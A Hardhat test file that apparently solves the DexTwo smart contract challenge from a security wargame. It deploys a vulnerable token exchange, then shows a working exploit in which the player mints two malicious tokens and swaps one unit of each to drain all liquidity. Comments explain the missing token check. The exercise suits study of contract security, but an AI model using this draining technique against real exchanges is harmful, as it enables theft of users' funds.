import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { DexTwo, SwappableToken } from "../typechain-types/contracts/DexTwo.sol";

import { expect } from "chai";
import { token } from "../typechain-types/@openzeppelin/contracts";


let accounts: Signer[];
let contract: DexTwo;
var token1: SwappableToken;
var token2: SwappableToken;

describe("solutions: DexTwo", () => {
    beforeEach(async () => {
        accounts = await ethers.getSigners();
        let owner = accounts[0].getAddress();
        let player = accounts[1].getAddress();
        const factory = await ethers.getContractFactory("DexTwo");
        const tokenFactory = await ethers.getContractFactory("SwappableToken");

        contract = await factory.deploy(); 

        token1 = await tokenFactory.deploy(contract.getAddress(), "token1", "t1", 110) as SwappableToken
        token2 = await tokenFactory.deploy(contract.getAddress(), "token2", "t2", 110) as SwappableToken


        await contract.setTokens(token1.getAddress(), token2.getAddress())

        //await token1.approve(owner, contract.getAddress(), 110)
        //await token2.approve(owner, contract.getAddress(), 110)
        await contract.connect(accounts[0]).approve(contract.getAddress(), 100)

        await contract.add_liquidity(token1.getAddress(), 100)
        await contract.add_liquidity(token2.getAddress(), 100)
        console.log((await token1.balanceOf(contract.getAddress())))

        await token1.transfer(player, 10)
        await token2.transfer(player, 10)      
    })
    it("Solves challenge", async () => {
        let player = await accounts[1]
        let attackToken = await (await ethers.getContractFactory("SwappableToken")).connect(player).deploy(player.getAddress(), "attack", "atk", 110) as SwappableToken
        let attackToken2 = await (await ethers.getContractFactory("SwappableToken")).connect(player).deploy(player.getAddress(), "attack2", "atk2", 110) as SwappableToken
        // The Dex contract swap mechanism does not check that the from token is actually one of the two tokens
        // provided in the liquidity pool. The getSwapAmount also does not check this.
        // Further the `getSwapAmount` function uses the balance of the contract to calculate the swap amount to the other token
        // In order to drain the pool we simply need to create a malicious token and send 1 unit to the contract
        // Now when we execute a swap from our malicious token in exchange for one of the target tokens the 
        // price formula will calculate our 1 malicious token as being worth the entirety of the target token liquidity 
        /// since 1(amountIn) * (targetTotal) / 1(Malicious Deposit) = targetTotal
        // we do this once for each target token with a separate malicious token and take all the money.

        await attackToken.connect(player).transfer(contract.getAddress(), 1)
        await attackToken2.connect(player).transfer(contract.getAddress(), 1)
        await attackToken.connect(player).approve(contract.getAddress(), 1)
        await attackToken2.connect(player).approve(contract.getAddress(), 1)

        await contract.connect(player).swap(attackToken.getAddress(), token1.getAddress(), 1)
        expect(await token1.balanceOf(contract.getAddress())).to.be.equal(0)
        expect(await token1.balanceOf(player.getAddress())).to.be.equal(110)

        await contract.connect(player).swap(attackToken2.getAddress(), token2.getAddress(), 1) 
        expect(await token2.balanceOf(contract.getAddress())).to.be.equal(0)
        expect(await token2.balanceOf(player.getAddress())).to.be.equal(110)
    })
})
